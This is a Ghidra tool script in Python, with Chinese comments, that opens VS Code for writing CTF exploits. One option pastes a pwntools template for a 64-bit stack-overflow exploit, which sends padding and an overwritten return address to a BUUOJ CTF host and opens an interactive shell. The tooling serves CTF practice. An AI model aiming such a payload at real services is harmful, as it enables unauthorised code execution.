# coding: utf-8
# 打开vscode编写exp
#@author 查壹壹
#@category Cha111Ng1
#@keybinding 
#@menupath Tools.查壹壹的工具箱🧰.打开vscode编写exp
#@toolbar ./logo/code_exp.png

import os
import pyperclip
import time
import pyautogui
import configparser


print(u"""
++++++++++++++++++++++++++++++++++++++++++
+  微信公众号：攻有道       By:Cha111Ng1    +
++++++++++++++++++++++++++++++++++++++++++
Github：https://github.com/Cha111Ng1/ghidra_scripts_cha11
""")

def code_null():
    # 定义要执行的命令
    current_program = getCurrentProgram()
    file_location = current_program.getExecutablePath()
    file_location_cha11 = file_location.replace(user_home,"~")
    command_to_execute = codefile + " " + file_location_cha11 + "_exp.py"
    print("[+]执行命令：" + command_to_execute)
    os.system(command_to_execute)

def code_zhan():
    # 定义要执行的命令
    current_program = getCurrentProgram()
    file_location = current_program.getExecutablePath()
    file_location_cha11 = file_location.replace(user_home,"~")
    command_to_execute = codefile + " " + file_location_cha11 + "_exp.py"
    print("[+]执行命令：" + command_to_execute)
    os.system(command_to_execute)
    parts = file_location.split("/")
    name_value = parts[-1]
    pyperclip.copy("""# 64位栈溢出模版
# ++++++++++++++++++++++++++++++++++++++++++
# +  微信公众号：攻有道       By:Cha111Ng1    +
# ++++++++++++++++++++++++++++++++++++++++++
# Github：https://github.com/Cha111Ng1/ghidra_scripts_cha11
from pwn import *

context(os='linux', arch="amd64", log_level="debug")
content = 0


# 计算出的填充字符
payload = b'a' * (15+8)
# 想要其返回的函数地址
system_addr = 0x804859b


def main():
    if content  == 1:
        # 本地文件方式
        cha11 = process("./%s")
    else:
        # 远程连接方式
        cha11 = remote('node4.buuoj.cn', '28844')
    # 跳到恶意位置
    exp = payload + p64(system_addr)
    # 发送恶意载荷
    cha11.sendline(exp)
    # 获得一个交互shell
    cha11.interactive()

main()"""%name_value)
    time.sleep(1.5)  # 2秒延迟，可以根据需要调整
    pyautogui.hotkey('command', 'v')  # 在 macOS 中，使用 Command+V 进行粘贴
    print("[+]自动生成exp模版成功\n")


def comd():
    choices = ["使用vscode打开exp文件", "使用vscode打开exp文件「并粘贴栈溢出模版」"]
    selected_option = askChoice("编写exp自动生成插件 By：Cha111Ng1", "选择一个功能:", choices, "")
    print("[+]选择的功能为：" + selected_option)
    return selected_option

## 配置信息
# 获取用户主目录的完整路径
user_home = os.path.expanduser("~")
# 从配置文件读取值
config = configparser.ConfigParser()
configcha11 = '%s/.config/ghidra_scripts_cha11/config.ini'%user_home
config.read(configcha11,encoding='utf-8')

# 获取codefile
codefile = config.get('codeexp', 'codefile')

try:
    print("[+]打开vscode编写exp")
    selected_option = comd()
    if selected_option == "使用vscode打开exp文件":
        code_null()
    elif selected_option == "使用vscode打开exp文件「并粘贴栈溢出模版」":
        code_zhan()
    
except Exception as e:
    print("An error occurred:", e)